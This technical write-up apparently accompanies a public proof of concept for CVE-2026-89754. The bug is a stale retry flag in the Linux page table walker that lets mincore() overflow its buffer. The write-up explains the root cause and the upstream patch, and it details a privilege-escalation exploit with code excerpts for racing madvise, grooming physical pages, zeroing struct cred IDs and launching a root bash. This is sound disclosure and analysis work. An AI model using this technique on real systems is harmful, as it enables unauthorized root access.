<p align="center">
  <img src="../assets/tux.png" width="550" alt="tux">
</p>

# Intro

CVE-2026-89754 is an out-of-bounds write vulnerability where retry state from the page table walker leaks into the upper level and causes `mincore()` to walk the same PUD range twice. If a PMD is removed in a race with `madvise(MADV_DONTNEED)`, `ACTION_AGAIN` remains set when control returns, and the result cursor of `mincore()` advances beyond its temporary kernel buffer of one page.

The public PoC turns this out-of-bounds write into a full local privilege escalation. It attacks a vulnerable Ubuntu 26.04 `7.0.0-30-generic` system from an unprivileged user account and launches a root shell.

This document explains the root cause of the vulnerability and the exploit flow of the Ubuntu PoC.

# Background

The Linux page table walker traverses the PGD, P4D, PUD, PMD, and PTE levels in order and invokes callbacks registered by the caller at each level. The `action` field of `struct mm_walk` carries control state between a callback and the walker. `ACTION_SUBTREE` continues into a lower page table, while `ACTION_AGAIN` requests that the current entry be read again.

On x86-64, one PUD covers 1 GiB and one PMD covers 2 MiB. If a lower PTE table is removed concurrently, mapping that PTE table can fail, so the walker must inspect the current PMD again. This retry is normal, but `ACTION_AGAIN` left by the previous callback must be reset on every retry.

`mincore()` records one byte for each page in the requested range to indicate whether the page is resident. The vulnerable Ubuntu kernel allocates one page as a temporary result buffer and processes up to 4096 pages at a time. The `mincore` callback advances `walk->private` to the next byte after each result is written.

`MADV_DONTNEED` removes PTE mappings in the target range and can also reclaim empty PTE tables. The PoC races `mincore()` against `madvise()` on the same mapping so that a present PMD becomes none during the walk.

# Root Cause

In the vulnerable Ubuntu source, `mincore_pte_range()` requests that the current PMD be inspected again if it cannot map the PTE table below that PMD.

```c
static int mincore_pte_range(pmd_t *pmd, unsigned long addr, unsigned long end,
			struct mm_walk *walk)
{
	spinlock_t *ptl;
	struct vm_area_struct *vma = walk->vma;
	pte_t *ptep;
	unsigned char *vec = walk->private;
	int nr = (end - addr) >> PAGE_SHIFT;
	int step, i;

	[...]

	ptep = pte_offset_map_lock(walk->mm, pmd, addr, &ptl);
	if (!ptep) {
		walk->action = ACTION_AGAIN;                    // <=[1]
		return 0;
	}
	[...]
}
```

`[1]` is a valid retry request after concurrent page table reclamation is detected. The problem is that this value is not cleared in the retry path of `walk_pmd_range()`.

```c
static int walk_pmd_range(pud_t *pud, unsigned long addr, unsigned long end,
			  struct mm_walk *walk)
{
	[...]
	pmd = pmd_offset(pud, addr);
	do {
again:
		next = pmd_addr_end(addr, end);
		if (pmd_none(*pmd)) {
			if (has_install)
				err = __pte_alloc(walk->mm, pmd);
			else if (ops->pte_hole)
				err = ops->pte_hole(addr, next, depth, walk);
			if (err)
				break;
			if (!has_install)
				continue;                              // <=[2]
		}

		walk->action = ACTION_SUBTREE;                    // <=[3]

		[...]
		if (ops->pmd_entry)
			err = ops->pmd_entry(pmd, addr, next, walk);
		if (err)
			break;

		if (walk->action == ACTION_AGAIN)
			goto again;
		[...]
	} while (pmd++, addr = next, addr != end);

	return err;
}
```

If a PMD that was present changes to none while its PTE table is being mapped, `[1]` sets `ACTION_AGAIN` and execution returns to `again`. The second inspection invokes the `pte_hole` callback and takes the `continue` at `[2]`. This branch skips the initialization at `[3]`, so `walk_pmd_range()` can finish while preserving the previous `ACTION_AGAIN` value.

At the next level, `walk_pud_range()` interprets the returned state as a request to retry the current PUD.

```c
static int walk_pud_range(p4d_t *p4d, unsigned long addr, unsigned long end,
			  struct mm_walk *walk)
{
	[...]
	pud = pud_offset(p4d, addr);
	do {
 again:
		next = pud_addr_end(addr, end);
		[...]
		walk->action = ACTION_SUBTREE;
		[...]
		err = walk_pmd_range(pud, addr, next, walk);
		if (err)
			break;

		if (walk->action == ACTION_AGAIN)
			goto again;                               // <=[4]
	} while (pud++, addr = next, addr != end);

	return err;
}
```

`[4]` executes before `addr` and `pud` advance to the next entry. The stale `ACTION_AGAIN` leaked from the lower walker therefore causes the entire PUD range to be walked again from the beginning.

The `mincore` callbacks advance a shared cursor after writing the result for each page, without a separate bounds check.

```c
static int mincore_unmapped_range(unsigned long addr, unsigned long end,
				   __always_unused int depth,
				   struct mm_walk *walk)
{
	walk->private += __mincore_unmapped_range(addr, end,
						  walk->vma, walk->private);
	return 0;
}

[...]

static int mincore_pte_range(pmd_t *pmd, unsigned long addr, unsigned long end,
			struct mm_walk *walk)
{
	[...]
out:
	walk->private += nr;                                  // <=[5]
	cond_resched();
	return 0;
}
```

Both callbacks, including `[5]`, advance `walk->private` by the number of pages processed. When the same PUD is walked again, the cursor already advanced during the first walk is not reset and advances by the same amount once more.

The temporary result space of `mincore()` is exactly one page.

```c
SYSCALL_DEFINE3(mincore, unsigned long, start, size_t, len,
		unsigned char __user *, vec)
{
	long retval;
	unsigned long pages;
	unsigned char *tmp;

	[...]
	tmp = (void *) __get_free_page(GFP_USER);             // <=[6]
	if (!tmp)
		return -EAGAIN;

	retval = 0;
	while (pages) {
		[...]
		retval = do_mincore(start, min(pages, PAGE_SIZE), tmp);
		[...]
	}
	free_page((unsigned long) tmp);
	return retval;
}
```

`[6]` allocates a temporary page of 4096 bytes and stores the result for one page in each byte. If the normal walk fills all 4096 bytes and then walks the same PUD range again, the subsequent results are written to adjacent kernel memory starting at `tmp + 4096`.

The `MADV_DONTNEED` path used in the race explicitly requests reclamation of empty page tables.

```c
static long madvise_dontneed_single_vma(struct madvise_behavior *madv_behavior)
{
	struct madvise_behavior_range *range = &madv_behavior->range;
	struct zap_details details = {
		.reclaim_pt = true,
		.even_cows = true,
	};

	zap_page_range_single_batched(
			madv_behavior->tlb, madv_behavior->vma, range->start,
			range->end - range->start, &details);         // <=[7]
	return 0;
}
```

`[7]` removes PTE mappings in the target range and also reclaims empty PTE tables. If this operation overlaps the PTE mapping in `mincore_pte_range()`, the retry at `[1]` and the PMD transition to none occur in succession.

# Exploit

The PoC controls the length of the duplicate walk and the `mincore` result values to write 8 bytes of `0x01` followed by 32 bytes of `0x00` immediately after the temporary page. It then assigns two contiguous physical pages to the `mincore` temporary page and a credential slab page, respectively, and overwrites the first 40 bytes of `struct cred` with this pattern.

## 1. Creating a write of 40 bytes at a PUD boundary

The PoC places the 4096 pages of one `mincore()` chunk across a PUD boundary. The first PUD contains 4056 pages and the second PUD contains 40 pages.

```c
#define PAGE_BYTES 4096UL
#define PMD_BYTES (2UL << 20)
#define PUD_BYTES (1UL << 30)
#define QUERY_PAGES PAGE_BYTES
#define OVERFLOW_BYTES 40UL
#define FIRST_PUD_PAGES (QUERY_PAGES - OVERFLOW_BYTES)
#define SECOND_PMD_PAGES (PMD_BYTES / PAGE_BYTES)
#define MAP_PAGES (FIRST_PUD_PAGES + SECOND_PMD_PAGES)

[...]

	boundary = align_up((uintptr_t)rm->reserve + first_len, PUD_BYTES);
	start = boundary - first_len;
	[...]
	rm->base = mapped;
	rm->second_pmd = (unsigned char *)boundary;

	[...]
	for (i = 0; i < FIRST_PUD_PAGES; i++)
		rm->base[i * PAGE_BYTES] = 0x41;

	for (i = 0; i < 8; i++)
		rm->second_pmd[i * PAGE_BYTES] = 0x42;
	for (i = 40; i < SECOND_PMD_PAGES; i++)
		rm->second_pmd[i * PAGE_BYTES] = 0x43;
```

Pages 0 through 7 included in the query in the second PUD are resident, while pages 8 through 39 are nonresident. Pages 40 through 511 outside the query are also made resident to provide a race window for repopulating the PTE table.

After the normal results for the second PUD are recorded, the cursor reaches exactly the end of the temporary page. When stale `ACTION_AGAIN` causes these 40 pages to be walked once more, the 8 `0x01` bytes from pages 0 through 7 and the 32 `0x00` bytes from pages 8 through 39 are written starting at offset 0 of the next physical page.

The reclaimer faults the resident pages in the same PMD range back in, then repeatedly applies `MADV_DONTNEED` to the full range of 2 MiB.

```c
static void *pte_reclaimer(void *opaque)
{
	struct race_map *rm = opaque;
	unsigned int none_pause;

	[...]
	while (!atomic_load_explicit(&stop_racer, memory_order_relaxed)) {
		refault_second_pmd(rm);
		if (madvise(rm->second_pmd, PMD_BYTES, MADV_DONTNEED) != 0)
			die("racer MADV_DONTNEED");
		atomic_fetch_add_explicit(&race_cycles, 1,
						  memory_order_relaxed);
		[...]
	}
	return NULL;
}
```

This loop continuously creates a race between the `mincore` callback that observes a present PMD and reclamation that changes the PMD to none.

## 2. Preparing contiguous physical pages X and Y

The out-of-bounds write begins at the direct mapping address immediately after the `mincore` temporary page. The PoC uses pipe pages to obtain contiguous order-0 pages `X` and `Y`, then returns them so that the next two page allocations receive `X` followed by `Y`.

It creates 4,000 pipes in advance, fills each pipe with pages, and then drains it. The first 3,997 pipes are filled with three pages to shape allocator state, while the candidate pipe receives four pages so its final two fresh pages become `X` and `Y`.

```c
static void release_pipe_reservoir(struct pipe_reservoir *reservoir)
{
	const size_t two_pages = 2 * PAGE_BYTES;
	ssize_t amount;

	transfer_exact(reservoir->pipes[PIPE_CANDIDATE].read_fd,
			       reservoir->io_buffer, two_pages, 0);
	splice_one_page(reservoir->pipes[PIPE_CANDIDATE].read_fd,
			reservoir->pipes[PIPE_HOLDER].write_fd);
	splice_one_page(reservoir->pipes[PIPE_CANDIDATE].read_fd,
			reservoir->pipes[PIPE_DESTINATION].write_fd);
	splice_one_page(reservoir->pipes[PIPE_HOLDER].read_fd,
			reservoir->pipes[PIPE_DESTINATION].write_fd);
	do {
		amount = read(reservoir->pipes[PIPE_DESTINATION].read_fd,
			      reservoir->io_buffer, two_pages);       // <=[8]
	} while (amount < 0 && errno == EINTR);
	if (amount != (ssize_t)two_pages)
		die("atomic pipe-pair release");
}
```

The three `splice()` calls leave live buffers in the destination pipe in `[Y, X]` order. `[8]` frees the two pages in Y, X order. Because of the return order of the per-CPU page allocator, the next allocation receives X and the allocation after that receives Y.

## 3. Holding X and turning Y into a credential slab

The PoC first has 256 workers invoke raw `setuid()` with their current UID. In the target kernel, `setuid()` executes `prepare_creds()` and `commit_creds()` even when the value does not change, filling empty objects in the existing credential slabs.

A new credential also requires an LSM security blob allocation. The PoC repeatedly opens `/proc/self/comm` and closes most of the files to supply free objects in the cache used by this blob. This arranges for the first slab allocation that must consume the new page Y to occur in the credential cache.

Immediately after returning X and Y to the page allocator, the PoC starts a long `mincore()` call over a mapping of 4 GiB. This system call allocates X as its temporary result page and holds it until the entire range has been processed.

```c
	[...]
	placement_ctx.progress_byte = placement_vec;
	placement_vec[0] = 0x7f;
	[...]
	release_pipe_reservoir(&reservoir);
	atomic_store_explicit(&placement_ctx.go, 1, memory_order_release);
	if (syscall(SYS_mincore, placement_map, PLACEMENT_BYTES,
		    placement_vec) != 0)                         // <=[9]
		die("placement mincore");
	atomic_store_explicit(&placement_ctx.placement_done, 1,
				      memory_order_release);
	[...]
```

As the `mincore()` call at `[9]` copies its first result chunk to the user vector, the coordinator releases 240 target workers. Each worker invokes raw `setuid()` on the same CPU on which `mincore()` continues to hold X, causing a new `struct cred` to be allocated. Prewarming has filled the existing partial slabs, and `mincore()` holds X, so the next page Y becomes a new credential slab. Each target worker moves to another CPU while keeping its allocated credential alive.

The target Ubuntu kernel uses slab freelist randomization. The PoC keeps enough target credentials alive to fill every object in Y and ensures that the worker whose object lies at page offset 0 is included among the attack targets.

## 4. Overwriting the first credential in Y

When the placement `mincore()` call finishes, X is returned, but the target workers continue to reference the credential objects in Y. The PoC repeatedly invokes the attack `mincore()` so that X is allocated as the temporary page again, then races it against the reclaimer to walk the second PUD twice.

In the BTF of the target kernel, `struct cred` is 184 bytes. It begins with `usage`, which occupies 8 bytes, followed by eight contiguous ID fields of 4 bytes each.

```c
struct cred {
	atomic_long_t	usage;                                  // <=[10]
	kuid_t		uid;
	kgid_t		gid;
	kuid_t		suid;
	kgid_t		sgid;
	kuid_t		euid;
	kgid_t		egid;
	kuid_t		fsuid;
	kgid_t		fsgid;
	unsigned	securebits;
	[...]
} __randomize_layout;
```

`[10]` occupies offsets `0x00` through `0x07` in Y, while the fields from `uid` through `fsgid` occupy offsets `0x08` through `0x27`. The write to the first 40 bytes produces the following result.

```
Y + 0x00..0x07: 01 01 01 01 01 01 01 01
Y + 0x08..0x27: 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00
```

`usage` becomes a large positive value, preventing the credential from being freed immediately. The following 32 bytes set `uid`, `gid`, `suid`, `sgid`, `euid`, `egid`, `fsuid`, and `fsgid` to 0. The target workers repeatedly call `getuid()` and `geteuid()` to detect whether their credentials have changed.

## 5. Launching a root shell

One worker with corrupted credentials acquires the atomic claim and launches Bash while inheriting the current terminal.

```c
static void exec_root_shell(void)
{
	char *const argv[] = { (char *)"bash",     (char *)"--noprofile",
			       (char *)"--norc", (char *)"-p",
			       (char *)"-i",     NULL };
	char *const envp[] = {
		(char *)"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
		(char *)"HOME=/root",
		(char *)"USER=root",
		(char *)"LOGNAME=root",
		(char *)"SHELL=/bin/bash",
		(char *)"TERM=xterm-256color",
		NULL
	};

	if (atomic_exchange_explicit(&root_claimed, 1, memory_order_acq_rel))
		return;
	printf("[+] root shell ready: uid=%ld euid=%ld\n", syscall(SYS_getuid),
	       syscall(SYS_geteuid));
	syscall(SYS_execve, "/bin/bash", argv, envp);          // <=[11]
	die("execve /bin/bash");
}
```

`[11]` replaces the worker whose UID and EUID are 0 with `/bin/bash`. The `-p` option preserves privileged mode and `-i` requests an interactive shell. No separate terminal is created, so the existing standard streams and controlling terminal remain attached.

# Patch

This vulnerability was fixed by upstream commit `aedf2efd1897`. The patch moves the initialization of `ACTION_SUBTREE` in `walk_pmd_range()` and `walk_pud_range()` to immediately after each `again` label.

The essential change in the upstream patch is shown below.

```diff
diff --git a/mm/pagewalk.c b/mm/pagewalk.c
--- a/mm/pagewalk.c
+++ b/mm/pagewalk.c
@@ -126,6 +126,7 @@ static int walk_pmd_range(pud_t *pud, unsigned long addr, unsigned long end,
 	pmd = pmd_offset(pud, addr);
 	do {
 again:
+		walk->action = ACTION_SUBTREE;
 		next = pmd_addr_end(addr, end);
 		if (pmd_none(*pmd)) {
 			if (has_install)
@@ -138,8 +139,6 @@ static int walk_pmd_range(pud_t *pud, unsigned long addr, unsigned long end,
 				continue;
 		}
 
-		walk->action = ACTION_SUBTREE;
-
 		/*
 		 * This implies that each ->pmd_entry() handler
 		 * needs to know about pmd_trans_huge() pmds
@@ -196,6 +195,7 @@ static int walk_pud_range(p4d_t *p4d, unsigned long addr, unsigned long end,
 	pud = pud_offset(p4d, addr);
 	do {
  again:
+		walk->action = ACTION_SUBTREE;
 		next = pud_addr_end(addr, end);
 		if (pud_none(*pud)) {
 			if (has_install)
@@ -208,8 +208,6 @@ static int walk_pud_range(p4d_t *p4d, unsigned long addr, unsigned long end,
 				continue;
 		}
 
-		walk->action = ACTION_SUBTREE;
-
 		if (ops->pud_entry)
 			err = ops->pud_entry(pud, addr, next, walk);
 		if (err)
```

Now, even if a PMD or PUD changes to none and execution takes the `pte_hole` and `continue` path, `walk->action` is initialized first at the retry point. A stale `ACTION_AGAIN` from a lower walker can no longer escape to an upper level, so the same PUD is not walked twice and the `mincore` result cursor does not cross the temporary page boundary.
